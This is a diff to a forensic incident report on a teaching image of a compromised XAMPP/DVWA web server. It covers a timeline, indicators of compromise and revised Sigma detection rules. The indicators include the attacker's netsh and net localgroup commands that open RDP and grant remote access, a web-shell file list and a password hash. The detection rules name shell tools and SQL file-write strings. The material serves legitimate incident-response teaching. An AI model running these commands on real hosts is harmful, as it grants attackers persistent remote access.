-| 2015-09-02 09:00:39 | Failed interactive logon, Administrator | — | Security.evtx 4625 type 2, SAM † |
-| 2015-09-02 09:05:06 | `user1` (RID 1005) created at the console | T1136.001 | SAM †, `cmdscan` † |
-| 2015-09-02 09:05:25 | `hacker` (RID 1006) created through command injection | T1136.001, T1059.003 | SAM †, `httpd.exe` memory † |
-| 2015-09-02 ~09:05 | Both added to Remote Desktop Users; firewall opened for RemoteDesktop | T1098, T1562.004 | `cmdscan` †, memory strings † |
-| 2015-09-02 09:28:30 | `cmd.exe` 1972 opened on the desktop | T1059.003 | Memory |
-| 2015-09-02 09:31:16 | LFI read of `etc\hosts` | T1190, T1005 | `access.log` |
-| 2015-09-02 ~09:32 | `data.txt` written in Administrator's profile † | T1059.003 | `$MFT` † |
-| 2015-09-02 09:33:23 | LFI read of `users\administrator\data.txt` | T1005 | `access.log` |
-| 2015-09-02 09:34:52 → 09:38:04 | LFI enumeration of phpMyAdmin config and XAMPP files | T1083, T1005 | `access.log`, `error.log` |
-| 2015-09-02 11:15:40 | sqlmap starts against `/dvwa/vulnerabilities/sqli/` | T1595.002, T1190 | `access.log` |
-| 2015-09-02 11:25:52 | `INTO OUTFILE` writes stager `tmpukudk.php` | T1505.003 | `access.log` |
-| 2015-09-02 11:25:53 → 11:26:04 | Backdoor `tmpbiwuc.php`: self-test, then `dir` | T1105, T1083 | `access.log` |
-| 2015-09-02 11:26:23 | sqlmap deletes stager and backdoor | T1070.004 | `access.log` |
-| 2015-09-03 06:52:19 → 06:52:24 | sqlmap resumes; stager `tmpudvfh.php`, backdoor `tmpbrjvl.php` | T1505.003, T1105 | `access.log` |
-| 2015-09-03 06:59:38 | sqlmap deletes both (no commands run) | T1070.004 | `access.log`, `$I30` |
-| 2015-09-03 07:10:56 | `phpshell.php` uploaded via DVWA upload | T1505.003, T1105 | `access.log` |
-| 2015-09-03 07:14:48 → 07:14:57 | `webshells.zip` appears; `c99.php` placed in `DVWA\` | T1105 | `$UsnJrnl` †, `$MFT` |
-| 2015-09-03 07:16:13 → 07:18:02 | `phpshell.php`: `dir`, `dir C:\`, `mkdir abc`, `dir` | T1059.003, T1083 | `access.log`, `$MFT` |
-| 2015-09-03 07:20:59 → 07:21:37 | `c99.php` opened; two `act=cmd` POSTs | T1505.003, T1059.003 | `access.log` |
-| 2015-09-03 07:31:30 | `phpshell2.php` uploaded | T1105 | `access.log` |
-| 2015-09-03 07:31:54 | `phpshell2.php` executed → 200, 2 bytes (reverse stager) | T1071.001 | `access.log` |
-| 2015-09-03 10:03:37 | Memory captured by responders (FTK Imager) | — | Memory |
-| 2015-09-12 17:42:25 → 18:19:18 | Host rebooted and Administrator logged on, before disk imaging | — | System.evtx, SAM †, registry |
+| 2015-08-23 10:32:24 | XAMPP stack running (MySQL 5.6.25 start) | — | Application.evtx, memory |
+| 2015-08-23 10:53:04 | Build-day `wget` crawl of the XAMPP dashboard from 10.20.0.58 | — | `access.log` |
+| 2015-08-23 10:53:26 | 4625 burst, `Student` from IT104-3 / 10.20.0.118 (ruled out) | — | Security.evtx |
+| 2015-09-02 06:00:04 | DVWA PHPIDS self-test link (`<script>eval(window.name)</script>`) from `::1` | — | `access.log` |
+| 2015-09-02 07:10:41 | First request from 192.168.56.102 (Iceweasel) | T1594 | `access.log` |
+| 2015-09-02 08:52:29 | First command-injection request (`/dvwa/vulnerabilities/exec/`) | T1190 | `access.log` |
+| 2015-09-02 09:00:39 | Failed interactive logon, Administrator | — | Security.evtx 4625 type 2, SAM |
+| 2015-09-02 09:05:06 | `user1` (RID 1005) created at the console | T1136.001 | SAM, `cmdscan` |
+| 2015-09-02 09:05:25 | `hacker` (RID 1006) created through command injection | T1136.001, T1059.003 | SAM, `httpd.exe` memory |
+| 2015-09-02 ~09:05 | Both added to Remote Desktop Users; firewall opened for RemoteDesktop | T1098, T1562.004 | `cmdscan`, memory strings |
+| 2015-09-02 09:28:30 | `cmd.exe` 1972 opened on the desktop | T1059.003 | Memory |
+| 2015-09-02 09:31:16 | LFI read of `etc\hosts` | T1190, T1005 | `access.log` |
+| 2015-09-02 ~09:32 | `data.txt` written in Administrator's profile | T1059.003 | `$MFT` |
+| 2015-09-02 09:33:23 | LFI read of `users\administrator\data.txt` | T1005 | `access.log` |
+| 2015-09-02 09:34:52 → 09:38:04 | LFI enumeration of phpMyAdmin config and XAMPP files | T1083, T1005 | `access.log`, `error.log` |
+| 2015-09-02 11:15:40 | sqlmap starts against `/dvwa/vulnerabilities/sqli/` | T1595.002, T1190 | `access.log` |
+| 2015-09-02 11:25:52 | `INTO OUTFILE` writes stager `tmpukudk.php` | T1505.003 | `access.log` |
+| 2015-09-02 11:25:53 → 11:26:04 | Backdoor `tmpbiwuc.php`: self-test, then `dir` | T1105, T1083 | `access.log` |
+| 2015-09-02 11:26:23 | sqlmap deletes stager and backdoor | T1070.004 | `access.log` |
+| 2015-09-03 06:52:19 → 06:52:24 | sqlmap resumes; stager `tmpudvfh.php`, backdoor `tmpbrjvl.php` | T1505.003, T1105 | `access.log` |
+| 2015-09-03 06:59:38 | sqlmap deletes both (no commands run) | T1070.004 | `access.log`, `$I30` |
+| 2015-09-03 07:10:56 | `phpshell.php` uploaded via DVWA upload | T1505.003, T1105 | `access.log` |
+| 2015-09-03 07:14:48 → 07:14:57 | `webshells.zip` appears; `c99.php` placed in `DVWA\` | T1105 | `$UsnJrnl`, `$MFT` |
+| 2015-09-03 07:16:13 → 07:18:02 | `phpshell.php`: `dir`, `dir C:\`, `mkdir abc`, `dir` | T1059.003, T1083 | `access.log`, `$MFT` |
+| 2015-09-03 07:20:59 → 07:21:37 | `c99.php` opened; two `act=cmd` POSTs | T1505.003, T1059.003 | `access.log` |
+| 2015-09-03 07:31:30 | `phpshell2.php` uploaded | T1105 | `access.log` |
+| 2015-09-03 07:31:54 | `phpshell2.php` executed → 200, 2 bytes (reverse stager) | T1071.001 | `access.log` |
+| 2015-09-03 10:03:37 | Memory captured by responders (FTK Imager) | — | Memory |
+| 2015-09-12 17:42:25 → 18:19:18 | Host rebooted and Administrator logged on, before disk imaging | — | System.evtx, SAM, registry |
 
 ---
 
-## Root cause analysis
+## Root Cause Analysis
 
-!!! danger "Root cause"
+!!! danger "Root Cause"
     A deliberately vulnerable training application (DVWA at security level *low*) was reachable on a server whose web stack ran with **administrative rights** and whose database could **write into the web root**. Every weakness the operator found therefore led straight to OS command execution as an administrator.
 
 **Contributing factors:**
@@ -583,7 +583,7 @@ explorer.exe (816)                    2015-08-23 10:30:34
 
 ---
 
-## Indicators of compromise
+## Indicators of Compromise
 
 === "Network"
     ```text
@@ -599,7 +599,7 @@ explorer.exe (816)                    2015-08-23 10:30:34
     NT hash (both)     817875ce4794a9262159186413772644
     ```
 
-=== "Web shells and staging"
+=== "Web Shells and Staging"
     ```text
     C:\xampp\htdocs\tmpukudk.php                     # sqlmap stager    (deleted)
     C:\xampp\htdocs\tmpbiwuc.php                     # sqlmap backdoor  (deleted)
@@ -609,23 +609,23 @@ explorer.exe (816)                    2015-08-23 10:30:34
     C:\xampp\htdocs\DVWA\hackable\uploads\phpshell2.php
     C:\xampp\htdocs\DVWA\hackable\uploads\abc\
     C:\xampp\htdocs\DVWA\c99.php                     # SHA-256 4320d95cc2fe61e0b862756f8c4ffb251c7d1391e2f6841887c3dc765ba0369c (VT 44/61)
-    webshells.zip  →  c99.php, webshell.php †
-    C:\Users\Administrator\data.txt                  # "hello" — write/read test †
+    webshells.zip  →  c99.php, webshell.php
+    C:\Users\Administrator\data.txt                  # "hello" — write/read test
     ```
 
-=== "Host changes"
+=== "Host Changes"
     ```text
     netsh firewall set service type=remotedesktop mode=enable scope=subnet
     net localgroup "Remote Desktop Users" user1 /add
     net localgroup "Remote Desktop Users" hacker /add
     ```
 
-=== "Memory-only"
+=== "Memory-Only"
     ```text
-    "Owned by hacker" strings in httpd.exe (PID 2880) †
+    "Owned by hacker" strings in httpd.exe (PID 2880)
     ```
 
-## What the evidence cannot tell us
+## What the Evidence Cannot Tell Us
 
 A report is as valuable for its stated limits as for its findings. These questions stay open, each with the artefact that would close it:
 
@@ -641,9 +641,9 @@ None of them changes the conclusion: the intrusion path, the accounts, the remot
 
 ---
 
-## Lessons learned
+## Lessons Learned
 
-### For the defender
+### For the Defender
 
 | Gap | Root cause | Recommended fix | Priority |
 |---|---|---|---|
@@ -655,7 +655,7 @@ None of them changes the conclusion: the intrusion path, the accounts, the remot
 | POST bodies lost | Only `access.log` | WAF / reverse proxy with request-body logging for sensitive forms | Medium |
 | Logs only on the victim | No forwarding | Forward EVTX and web logs to a central store | Medium |
 
-### For the investigator
+### For the Investigator
 
 1. **Profile before you hunt.** Knowing it was a 2008 server running XAMPP predicted the missing artefacts (Prefetch, 4688) and pointed straight at `access.log`.
 2. **An absence needs a mechanism.** "No ProfileList entry" became "created and never logged on" once the condition that creates the artefact was known.
@@ -668,16 +668,51 @@ None of them changes the conclusion: the intrusion path, the accounts, the remot
 
 ---
 
-## Detection rules derived
+## Detection Rules Derived
 
-These rules target what this attack actually did. The first needs process-creation telemetry (Sysmon or 4688 with command line), which this server lacked.
+!!! warning "A Rule Is Only as Real as the Telemetry Underneath It"
+    Every rule below is written against a **procedure** — the step an operator has to take —
+    rather than the single command this operator happened to type. A rule that matches
+    `net user hacker hacker /add` catches one string. A rule that matches *a web server
+    worker spawning an account utility* catches the step, whatever the string.
 
-=== "Web server spawns OS commands"
+    But procedure-level logic only fires if the environment produces the events it reads.
+    **This server produced almost none of them**: process-creation auditing was off, there
+    was no Sysmon, no file-integrity monitoring, and `access.log` records query strings but
+    never POST bodies — which is exactly why the command-injection commands had to be
+    recovered from process memory. Three of the five rules below would have returned nothing
+    here. That is not a reason to skip them; it is the gap analysis.
+
+### Telemetry This Section Depends On
+
+| Rule | Required telemetry | Catches | Blind to |
+|---|---|---|---|
+| 1 — Worker spawns a shell | Sysmon 1 or 4688 **with command line and parent image** | Every OS-command path in this case: injection, `--os-shell`, `phpshell`, `c99` | Backdoors that never spawn a process — pure-PHP file and database operations, in-process reverse shells |
+| 2 — Script written to a web root | Sysmon 11 (`FileCreate`), EDR file events, or file-integrity monitoring | Delivery by **any** channel: upload, `INTO OUTFILE`, archive extraction, FTP | Non-standard web roots; content written inside an existing file rather than a new one |
+| 3 — RDP enabled or allowed | Process creation **with command line** | `netsh` legacy and `advfirewall`, the registry switch, the PowerShell equivalent | Registry written through an API with no process; changes pushed by Group Policy |
+| 4 — Added to Remote Desktop Users | Security log, event **4732** | The privilege grant itself, which is the step that matters | Nothing — this one is cheap and reliable, and it is on by default |
+| 5 — SQL file-write primitive | Web server logs **including query strings** | `INTO OUTFILE` / `DUMPFILE` / `LOAD_FILE` delivered by GET | **Anything in a POST body.** In this case that is the entire command-injection campaign |
+
+!!! tip "Read the Blind-Spot Column First"
+    Rule 4 needs a log that Windows already writes. Rules 1–3 need endpoint telemetry this
+    host did not have, and rule 5 needs a log that cannot see half the traffic. If you can
+    deploy only one thing after reading this report, deploy process-creation auditing with
+    command line — it is what turns rules 1 and 3 from theory into detections.
+
+=== "1 — Worker Spawns a Shell"
     ```yaml
-    title: Web Server Process Spawning Account or Firewall Commands
+    title: Web Server Worker Spawning a Shell or Administrative Utility
     id: 0b11285d-d048-4b4e-8f45-9ab0925aebb0
     status: experimental
-    description: A web server worker spawns cmd/net/netsh, as a web shell or command injection does when it runs OS commands.
+    description: >
+      A web server worker process spawns a command interpreter or a built-in
+      administrative utility. This is the single step behind every OS-command
+      path in this case - DVWA command injection, the sqlmap --os-shell
+      backdoor, phpshell.php and c99.php all reached the operating system
+      through it, with different payloads each time.
+    references:
+      - https://attack.mitre.org/techniques/T1505/003/
+      - https://attack.mitre.org/techniques/T1059/003/
     logsource:
       product: windows
       category: process_creation
@@ -685,19 +720,32 @@ These rules target what this attack actually did. The first needs process-creati
       selection_parent:
         ParentImage|endswith:
           - '\httpd.exe'
+          - '\php.exe'
           - '\php-cgi.exe'
           - '\w3wp.exe'
-          - '\tomcat.exe'
+          - '\nginx.exe'
+          - '\node.exe'
+          - '\tomcat9.exe'
+          - '\tomcat10.exe'
       selection_child:
         Image|endswith:
           - '\cmd.exe'
+          - '\powershell.exe'
+          - '\pwsh.exe'
           - '\net.exe'
           - '\net1.exe'
           - '\netsh.exe'
+          - '\reg.exe'
+          - '\sc.exe'
+          - '\wmic.exe'
           - '\whoami.exe'
+          - '\certutil.exe'
+          - '\bitsadmin.exe'
       condition: selection_parent and selection_child
     falsepositives:
-      - Web applications that legitimately shell out (rare; baseline first)
+      - Applications that legitimately shell out, such as reporting or backup
+        jobs started by the web tier. Baseline the parent/child pairs that
+        already occur before enabling.
     level: high
     tags:
       - attack.persistence
@@ -706,62 +754,114 @@ These rules target what this attack actually did. The first needs process-creati
       - attack.t1059.003
     ```
 
-=== "SQLi file write / sqlmap"
+=== "2 — Script Written to a Web Root"
     ```yaml
-    title: SQL Injection File Write or sqlmap in Web Server Logs
-    id: 9e317ac9-c95f-41de-b8ba-14fb57fb2447
+    title: Server-Side Script Created Inside a Web Root
+    id: 2c6f1ab4-9d1e-4a0f-9a7a-8b0e2c5f31d7
     status: experimental
-    description: sqlmap User-Agent, or an INTO OUTFILE/DUMPFILE file write attempted through a query string.
+    description: >
+      A file with a server-side script extension is created in a directory the
+      web server serves. This catches the delivery step regardless of how the
+      file arrived, which is the point: in this case c99.php reached the web
+      root with no HTTP request recorded at all, so no log-only rule could
+      ever have seen it.
+    references:
+      - https://attack.mitre.org/techniques/T1505/003/
     logsource:
-      category: webserver
+      product: windows
+      category: file_event
     detection:
-      selection_ua:
-        cs-user-agent|contains: 'sqlmap'
-      selection_outfile:
-        cs-uri-query|contains:
-          - 'INTO%20OUTFILE'
-          - 'INTO+OUTFILE'
-          - 'INTO OUTFILE'
-          - 'INTO%20DUMPFILE'
-      condition: selection_ua or selection_outfile
+      selection_path:
+        TargetFilename|contains:
+          - '\htdocs\'
+          - '\wwwroot\'
+          - '\inetpub\'
+          - '\webapps\'
+          - '\public_html\'
+      selection_ext:
+        TargetFilename|endswith:
+          - '.php'
+          - '.phtml'
+          - '.php5'
+          - '.asp'
+          - '.aspx'
+          - '.ashx'
+          - '.jsp'
+          - '.jspx'
+      filter_deployment:
+        Image|endswith:
+          - '\msdeploy.exe'
+          - '\git.exe'
+      condition: selection_path and selection_ext and not filter_deployment
     falsepositives:
-      - Authorised penetration tests
+      - Application deployment. Add your build agents and deployment tooling to
+        the filter. Where deployment is frequent, scope the rule to directories
+        that must never change at runtime - an uploads folder is the obvious
+        one, and is where phpshell.php landed here.
     level: high
     tags:
-      - attack.initial-access
-      - attack.t1190
+      - attack.persistence
+      - attack.t1505.003
     ```
 
-=== "Netsh opens RDP"
+=== "3 — RDP Enabled or Allowed"
     ```yaml
-    title: Windows Firewall Opened for Remote Desktop via Netsh
+    title: Remote Desktop Enabled or Allowed Through the Host Firewall
     id: 7f53963e-8d9d-4356-be21-b22e6d655a0b
     status: experimental
-    description: Legacy netsh firewall syntax used to enable the RemoteDesktop service exception.
+    description: >
+      Remote Desktop is turned on, or a firewall exception is created for it,
+      from a command line. The operator in this case used the legacy netsh
+      firewall syntax; the same outcome is reachable through advfirewall, the
+      fDenyTSConnections registry value, or PowerShell, so all four are here.
+    references:
+      - https://attack.mitre.org/techniques/T1562/004/
+      - https://attack.mitre.org/techniques/T1021/001/
     logsource:
       product: windows
       category: process_creation
     detection:
-      selection:
+      selection_netsh_legacy:
         Image|endswith: '\netsh.exe'
         CommandLine|contains|all:
           - 'firewall'
           - 'remotedesktop'
-      condition: selection
+      selection_netsh_advfirewall:
+        Image|endswith: '\netsh.exe'
+        CommandLine|contains|all:
+          - 'advfirewall'
+          - 'add rule'
+          - '3389'
+      selection_registry_switch:
+        CommandLine|contains: 'fDenyTSConnections'
+      selection_powershell:
+        CommandLine|contains|all:
+          - 'Enable-NetFirewallRule'
+          - 'RemoteDesktop'
+      condition: 1 of selection_*
     falsepositives:
-      - Administrators enabling RDP by script
+      - Administrators enabling RDP during build or maintenance. Correlate with
+        the account that ran it and whether a change record exists.
     level: medium
     tags:
       - attack.defense-evasion
       - attack.t1562.004
+      - attack.lateral-movement
+      - attack.t1021.001
     ```
 
-=== "Added to Remote Desktop Users"
+=== "4 — Added to Remote Desktop Users"
     ```yaml
-    title: Local Account Added to Remote Desktop Users
+    title: Member Added to the Local Remote Desktop Users Group
     id: 7d43c4f4-8b38-4f7e-8cad-4745db55cf56
     status: experimental
-    description: A member was added to the local Remote Desktop Users group (4732), as happened with user1 and hacker.
+    description: >
+      A member is added to the built-in Remote Desktop Users group
+      (S-1-5-32-555). Creating an account is cheap and common; granting it
+      remote access is the step that turns it into a foothold, and it is the
+      step Windows logs by default.
+    references:
+      - https://attack.mitre.org/techniques/T1098/
     logsource:
       product: windows
       service: security
@@ -771,40 +871,102 @@ These rules target what this attack actually did. The first needs process-creati
         TargetSid: 'S-1-5-32-555'
       condition: selection
     falsepositives:
-      - Help-desk or provisioning workflows
+      - Help-desk and provisioning workflows. Baseline which accounts perform
+        this and from where.
     level: medium
     tags:
       - attack.persistence
       - attack.t1098
     ```
 
----
-## References and further reading
+    !!! info "The pair is what makes it high fidelity"
+        On its own this is a medium-confidence rule. **4720** (account created) followed by
+        **4732** to this SID within a few minutes is a much stronger signal — in this case
+        the two accounts were created 19 seconds apart and granted RDP immediately.
+
+        That correlation is deliberately not written as a Sigma rule here: correlation
+        support varies by backend, and a rule that silently fails to compile is worse than
+        no rule. Build it in whatever your SIEM actually supports, and keep the single-event
+        rule above as the floor.
+
+=== "5 — SQL File-Write Primitive"
+    ```yaml
+    title: SQL File-Write or File-Read Primitive in a Web Server Query String
+    id: 9e317ac9-c95f-41de-b8ba-14fb57fb2447
+    status: experimental
+    description: >
+      A MySQL file primitive appears in a request query string. INTO OUTFILE is
+      what turned SQL injection into code execution in this case: the database
+      account held FILE, and the web root was writable, so the query wrote a
+      PHP stager that Apache then served.
+    references:
+      - https://attack.mitre.org/techniques/T1190/
+    logsource:
+      category: webserver
+    detection:
+      selection:
+        cs-uri-query|contains:
+          - 'INTO OUTFILE'
+          - 'INTO%20OUTFILE'
+          - 'INTO+OUTFILE'
+          - 'INTO DUMPFILE'
+          - 'INTO%20DUMPFILE'
+          - 'INTO+DUMPFILE'
+          - 'LOAD_FILE('
+          - 'LOAD_FILE%28'
+      condition: selection
+    falsepositives:
+      - Authorised penetration tests and database tooling that legitimately
+        exports to file.
+    level: high
+    tags:
+      - attack.initial-access
+      - attack.t1190
+    ```
+
+    !!! danger "This rule cannot see POST bodies"
+        It matches the query string, so it catches the `INTO OUTFILE` request in this case
+        and misses the entire command-injection campaign, which travelled as POST bodies to
+        `/dvwa/vulnerabilities/exec/`. Closing that gap needs a WAF or reverse proxy that
+        logs request bodies for the forms you care about — not a better pattern.
+
+        The `sqlmap` User-Agent is deliberately **not** a selection here. A User-Agent is
+        one flag away from being anything the operator wants, so it belongs in a hunt as a
+        pivot, not in a rule as a detection.
+
+## References and Further Reading
 
 Grouped by what you would reach for them *for*, rather than by publisher. Everything used in
 the investigation is here, starting with the case itself.
 
-=== "The case"
+=== "The Case"
     Where every artefact in this report comes from.
 
     - **Dr. Ali Hadi — DFIR Challenge #1, Web Server Case**: the published teaching image behind this entire report — a Windows Server 2008 host running XAMPP and DVWA, captured as an E01 disk image and a raw memory dump. [ashemery.com/dfir.html](https://www.ashemery.com/dfir.html)
     - **Evidence files**: [archive.org/details/dfir-case1](https://archive.org/details/dfir-case1) — the E01, the memory capture, the dd copy and the hash manifest.
 
-=== "Acquisition & handling"
+    Other published analyses of this same image, credited for the findings they reached first:
+
+    - [Between Two DFIRns — Web Server Case analysis](https://betweentwodfirns.blogspot.com/2017/03/ashemerycom-challenge-1-web-server-case.html)
+    - [#include &lt;sys/socket.h&gt; — Web Server Case analysis](https://socketo.hatenablog.jp/entry/2018/02/05/032146)
+    - [Just Another DFIR Blog, November 2015](http://justanotherdfirblog.blogspot.com/2015/11/)
+    - [CyberDefenders "Injector" analysis](https://medium.com/@chaoskist/cyberdefenders-write-up-injector-776e8117b466) — the same image, republished as a lab.
+
+=== "Acquisition & Handling"
     Opening the evidence without changing it, and collecting from it repeatably.
 
     - [Arsenal Image Mounter](https://arsenalrecon.com/products/arsenal-image-mounter) — write-temporary mounting: every tool sees a writable disk while writes go to a disposable overlay.
     - [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape) — the `!SANS_Triage` target pulls hives, event logs, file-system metadata and user artefacts in one documented pass.
     - **FTK Imager** — used here both as the responders' acquisition tool (visible in memory) and for browsing the mounted image.
 
-=== "Windows artefacts"
+=== "Windows Artefacts"
     Registry, event logs and the file system.
 
     - [Eric Zimmerman's tools](https://ericzimmerman.github.io/) — EvtxECmd, MFTECmd, Registry Explorer and Timeline Explorer. Registry Explorer replays transaction logs, which matters for a hive written by a live system.
     - [Hayabusa](https://github.com/Yamato-Security/hayabusa) — Sigma-based triage across every EVTX at once; the fastest way to find what is worth opening by hand.
     - [Autopsy](https://www.autopsy.com/) — carving and file-system review against the raw image.
 
-=== "Memory & decoding"
+=== "Memory & Decoding"
     Where the POST bodies, console history and process context live.
 
     - [MemProcFS](https://github.com/ufrisk/MemProcFS) — forensic mode, for browsing memory as a file system.
@@ -818,14 +980,6 @@ the investigation is here, starting with the case itself.
     - [sqlmap](https://sqlmap.org/) — the source of the `--os-shell` stager/backdoor pattern, the `tmpu`/`tmpb` naming and the automatic clean-up on exit. Recognising it changed how the whole cluster reads.
     - [DVWA](https://github.com/digininja/DVWA) — the vulnerable application, including the PHPIDS self-test link that looked like an XSS attack.
     - [MITRE ATT&CK](https://attack.mitre.org/) — technique mapping for the timeline.
-
-=== "Published analyses (†)"
-    Other people's analysis of the **same evidence image**. Findings marked **†** were completed from these and checked against my own artefacts for consistency — each agrees with a timestamp, file or log line I observed.
-
-    - [Between Two DFIRns — Web Server Case analysis](https://betweentwodfirns.blogspot.com/2017/03/ashemerycom-challenge-1-web-server-case.html)
-    - [#include &lt;sys/socket.h&gt; — Web Server Case analysis](https://socketo.hatenablog.jp/entry/2018/02/05/032146)
-    - [Just Another DFIR Blog, November 2015](http://justanotherdfirblog.blogspot.com/2015/11/)
-    - [CyberDefenders "Injector" analysis](https://medium.com/@chaoskist/cyberdefenders-write-up-injector-776e8117b466) — the same image, republished as a lab.
 
 *[DFIR]: Digital Forensics and Incident Response
 *[DVWA]: Damn Vulnerable Web Application
